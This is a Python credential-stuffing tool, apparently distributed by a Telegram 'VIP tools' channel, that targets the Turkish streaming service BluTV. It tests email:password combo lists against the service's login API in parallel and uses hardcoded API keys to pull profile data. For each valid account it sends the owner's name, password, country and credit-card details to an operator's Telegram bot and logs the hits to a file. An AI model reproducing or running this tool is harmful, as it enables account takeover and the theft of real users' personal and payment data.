import concurrent.futures
import requests
import telebot
from cfonts import render
import sys
import time
import os
def lo(word):
    Keneviz = [
        "\x1b[1;91m■\x1b[0m□□□□□□□□□]",
        "\x1b[1;92m■■\x1b[0m□□□□□□□□]",
        "\x1b[1;93m■■■\x1b[0m□□□□□□□]",
        "\x1b[1;94m■■■■\x1b[0m□□□□□□]",
        "\x1b[1;95m■■■■■\x1b[0m□□□□□]",
        "\x1b[1;96m■■■■■■\x1b[0m□□□□]",
        "\x1b[1;97m■■■■■■■\x1b[0m□□□]",
        "\x1b[1;98m■■■■■■■■\x1b[0m□□]",
        "\x1b[1;99m■■■■■■■■■\x1b[0m□]",
        "\x1b[1;92m■■■■■■■■■■\x1b[0m]"
    ]
    for i in range(10):
        for x in range(len(Keneviz)):
            sys.stdout.write(("\r{}{}".format(str(word), Keneviz[x])))
            sys.stdout.flush()
            time.sleep(0.02)

lo("\x1b[1;91m             Tool Yükleniyor...")
print("\x1b[1;92m  Yüklendi ✓ ")
time.sleep(2)
os.system('clear')

a = "\033[91m"  
b = "\033[92m"   
c = "\033[93m"  
d = "\033[94m"  
e = "\033[95m"  
f = "\033[96m"   
g = "\033[97m"    
h = "\033[90m"  
r = "\033[0m"   



logo = render('Blutv', font='block', colors=['blue', 'white'], align='center', space=True)   
print(logo) 

bot_token = input("\x1b[1;93mToken Gir => ")
chat_id = input("\x1b[1;93m\nID Gir =>")
bot = telebot.TeleBot(bot_token)

dosya_yolu = input("\x1b[1;93m\nCombo Yolu Gir =>")

def check_account(email, password):
    url = "https://smarttv.blutv.com.tr/actions/account/login"
    data = f"username={email}&password={password}&platform=com.blu.smarttv"
    headers = {
        "deviceid": "Windows:Chrome:94.0.4606.71",
        "deviceresolution": "1366x768",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://www.blutv.com",
        "sec-ch-ua": '\"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '\"Windows\"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36"
    }

    response = requests.post(url, data=data, headers=headers)

    if '"status":"ok"' in response.text:
        profile_response = response.json()
        user_info = profile_response.get('user', {})
        country = user_info.get('Country', 'Bilinmiyor')
        kartinfoL = user_info.get('CardId', 'Bilinmiyor')
        kart = user_info.get('CreditCard', 'Bilinmiyor')
        kartthri = user_info.get('CreditCardDate', 'Bilinmiyor')
        kartinfo = user_info.get('CardStatus', 'Bilinmiyor')
        first_name = user_info.get('FirstName', 'Bilinmiyor')
        last_name = user_info.get('LastName', 'Bilinmiyor')
        payment_price = user_info.get('Price', 'Bilinmiyor')
        start_date = user_info.get('StartDate', 'Bilinmiyor')
        end_date = user_info.get('EndDate', 'Bilinmiyor')

        try:
            access_token = profile_response["user"].get("AccessToken", None)
            if access_token:
                headers = {
                    'Authorizationtoken': f'Bearer {access_token}',
                    'Authorization': 'Basic 5e1f164cab95a20030e97a47:xqBlMqQPx3Phw8N8FToiiXNt04B2SXTS',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36',
                    'Accept': 'application/json, text/plain, */*',
                    'Appauthorization': 'Basic 54b03846058d0220945530b4:hyoGZ78iYfvx+KpB2oNcAq05oOJlTQmtWRdCVPuVmxJDeiOCrJ3eVS7+JUpRPJGLKJbAOAzlB4v+a5HRL22v2Q==',
                    'Origin': 'https://smarttv.blutv.com.tr',
                    'Referer': 'https://smarttv.blutv.com.tr/',
                }

                profile_url = "https://adapter.blupoint.io/api/projects/5d2dc68a92f3636930ba6466/smarttv/get-profiles"
                profile_response = requests.get(profile_url, headers=headers).json()

                if "profiles" in profile_response:
                    profiles = profile_response["profiles"]
                    total_profiles = len(profiles)
                    pin_profiles = sum(1 for profile in profiles if profile.get("has_pin", False))

                    message = (
                        "╭━━━━━━━━━━━━━━━━━━━━━━\n"
                        "┃▄▀▄▀▄▀📂 𝔹𝕝𝕦𝕥𝕧 ℍ𝕖𝕤𝕒𝕡 ▀▄▀▄▀▄\n"
                        "╰━━━━━━━━━━━━━━━━━━━━━━\n"
                        "╭━━━━━━━━━━━━━━━━━━━━━━\n"
                        "┃▀▄▀▄▀▄👤 𝕂𝕚𝕤̧𝕚 𝔹𝕚𝕝𝕘𝕚𝕝𝕖𝕣𝕚▄▀▄▀▄▀\n"
                        "┃━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"┃➥ 📧 E-posta : {email}\n"
                        f"┃➥ 🔑 Şifre : {password}\n"
                        f"┃➥ 🌎 Ülke : {country}\n"
                        f"┃➥ 👤 Ad : {first_name}\n"
                        f"┃➥ 👤 Soyad : {last_name}\n"
                        "╰━━━━━━━━━━━━━━━━━━━━━━\n"
                        "╭━━━━━━━━━━━━━━━━━━━━━━\n"
                        "┃▄▀▄▀▄▀💳 𝕂𝕒𝕣𝕥 𝔹𝕚𝕝𝕘𝕚𝕝𝕖𝕣𝕚▀▄▀▄▀▄\n"
                        "┃━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"┃➥ 💳 Kart Aktifliği : {kartinfo}\n"
                        f"┃➥ 📅 Kart Tarihi : {kartthri}\n"
                        f"┃➥ 💳 Kredi Kartı : {kart}\n"
                        f"┃➥ 🆔 Kart Kimliği : {kartinfoL}\n"
                        "╰━━━━━━━━━━━━━━━━━━━━━━\n"
                        "╭━━━━━━━━━━━━━━━━━━━━━━\n"
                        "┃▀▄▀▄▀▄👥 ℍ𝕖𝕤𝕒𝕡 𝔹𝕚𝕝𝕘𝕚𝕝𝕖𝕣𝕚▄▀▄▀▄▀ \n"
                        "┃━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"┃➥ 💸 Ödenen Fiyat : {payment_price}\n"
                        f"┃➥ 👫 Toplam Profil Sayısı : {total_profiles}\n"
                        f"┃➥ 📍 Pin'li Profil Sayısı : {pin_profiles}\n"
                        f"┃➥ ⏳ Abonelik Başlangıç Tarihi : {start_date}\n"
                        f"┃➥ ⌛ Abonelik Bitiş Tarihi : {end_date}\n"
                        "╰━━━━━━━━━━━━━━━━━━━━━━\n"
                        "╭━━━━━━━━━━━━━━━━━━━━━━\n"
                        "┃ 🔗 Tg : @KenevizVipTools "
                        "┃ ✍️ BY: @Keneviiz  \n"
                        "╰━━━━━━━━━━━━━━━━━━━━━━"
                    )
                    bot.send_message(chat_id, message)
                    print(f"Başarılı giriş ✅: {message}")

                    with open('Keneviz Tarafından Oluşturulan BluTv Hitlerin.txt', 'a') as x:
                        x.write(email + ":" + password + "\n")
                else:
                    print(f"Profil alınamadı: {email}")
            else:
                print(f"AccessToken bulunamadı: {email}")
        except ValueError:
            print(f"JSON yanıtı işlenemedi: {email}")
    else:
        print(f"Giriş başarısız: {email}")

def process_file(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()

    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = []
        for line in lines:
            line = line.strip()
            if ':' in line:
                email, password = line.split(':', 1)
                futures.append(executor.submit(check_account, email, password))
        for future in concurrent.futures.as_completed(futures):
            print(future.result())
process_file(dosya_yolu)